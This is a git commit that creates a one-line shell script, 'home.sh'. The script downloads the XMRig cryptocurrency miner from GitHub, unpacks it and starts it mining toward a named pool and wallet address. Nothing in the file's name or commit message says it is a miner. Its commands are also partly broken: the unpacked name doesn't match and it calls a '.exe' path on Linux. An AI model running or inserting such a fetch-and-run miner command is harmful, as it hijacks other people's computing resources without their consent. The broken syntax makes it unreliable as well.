432a7faf4423593974ca589305019df986592375
nainainaimah <118873302+nainainaimah@users.noreply.github.com>
2022-11-23 13:00:53 +0300

    Create home.sh

---
+++ home.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz && tar -xvf xmrig-6.18.1 && -/xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u MATIC:0x3C5fB5fD2E3D569e5a35664595E8BFAAdD05Dc06.naima -p x
